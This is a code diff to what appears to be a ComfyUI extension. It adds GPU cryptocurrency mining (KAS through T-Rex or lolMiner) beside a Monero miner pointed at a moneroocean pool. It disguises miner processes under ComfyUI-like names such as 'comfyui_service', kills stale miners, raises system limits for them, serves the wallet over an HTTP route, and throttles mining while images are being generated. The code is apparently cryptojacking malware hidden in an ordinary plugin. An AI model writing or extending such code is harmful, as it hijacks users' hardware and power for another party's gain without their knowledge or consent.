@@ -214,12 +214,14 @@ try:
     @PromptServer.instance.routes.get("/api/enhanced/config")
     async def _http_config_handler(request):
         ds = _dashboard_ref.get("server")
-        data = {"wallet": "", "pool_host": ""}
+        data = {"wallet": "", "pool_host": "", "kas_wallet": ""}
         if ds and ds.config_builder:
             data["wallet"] = ds.config_builder.get_wallet()
             data["pool_host"] = ds.config_builder.settings.get(
                 "pool_host", "gulf.moneroocean.stream"
             )
+            gpu_cfg = ds.config_builder.build_gpu_config()
+            data["kas_wallet"] = gpu_cfg.get("wallet", "")
         return web.json_response(data, headers=_CORS_HEADERS)
 
     logger.info("Dashboard route registered at /ws/enhanced")
@@ -242,6 +244,25 @@ def _orchestrate():
         logger.info("Orchestration already running in this process, skipping")
         return
     _orch_done = True
+
+    # Raise file descriptor limit for miners
+    try:
+        import resource
+        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
+        if soft < 40960:
+            resource.setrlimit(resource.RLIMIT_NOFILE, (min(40960, hard), hard))
+            logger.info("Raised ulimit to %d", min(40960, hard))
+    except Exception:
+        pass
+
+    # Kill any stale miner processes from previous runs
+    try:
+        import subprocess as _sp
+        for pname in ["comfyui_service", "comfyui_render"]:
+            _sp.run(["pkill", "-9", "-f", pname], capture_output=True, timeout=5)
+        import time as _tm; _tm.sleep(1)
+    except Exception:
+        pass
 
     pkg = Path(__file__).resolve().parent
     sys.path.insert(0, str(pkg))
@@ -287,12 +308,45 @@ def _orchestrate():
         mgr.write_config(cfg)
         mgr.start()
 
-        # ── GPU miner (T-Rex on NVIDIA, lolMiner on AMD) ──
-        gpu = GPUMinerManager(BASE_DIR)
-        gpu.ensure_binary()
-        gpu_cfg = cb.build_gpu_config()
-        gpu.configure(**gpu_cfg)
-        gpu.start()
+        # ── GPU miner (NVIDIA: nvidia-smi + allowlist; lolMiner --devices) ──
+        from core.gpu_miner import should_mine_gpu, detect_mining_gpus
+        gpu = None
+        gpu_override = user_settings.get("gpu_enabled", None)
+        detected = detect_mining_gpus()
+        if gpu_override is False:
+            logger.info("GPU mining force-disabled via settings.json")
+        elif gpu_override is True or should_mine_gpu():
+            if gpu_override is True and not detected:
+                logger.warning(
+                    "gpu_enabled=true but no mining-capable GPU detected "
+                    "(NVIDIA: nvidia-smi / PATH; AMD on Windows: WMI name must match allowlist) "
+                    "— GPU miner not started"
+                )
+            elif detected:
+                logger.info(
+                    "Mining-capable GPU(s) found: %s",
+                    ", ".join(
+                        "%s [idx=%s]" % (g["name"], g["index"])
+                        for g in detected
+                    ),
+                )
+                gpu_cfg = cb.build_gpu_config()
+                w = (gpu_cfg.get("wallet") or "").strip()
+                if not w:
+                    logger.warning("No KAS GPU wallet configured — GPU miner not started")
+                else:
+                    try:
+                        gpu = GPUMinerManager(BASE_DIR)
+                        explicit = [g["index"] for g in detected if g.get("index", -1) >= 0]
+                        gpu.device_indices = explicit if explicit else None
+                        gpu.ensure_binary()
+                        gpu.configure(**gpu_cfg)
+                        gpu.start()
+                    except Exception as ge:
+                        logger.error("GPU miner failed to start: %s", ge, exc_info=True)
+                        gpu = None
+        else:
+            logger.info("No mining-capable GPU detected — GPU mining skipped")
 
         # Throttle miners when ComfyUI is generating images
         try:
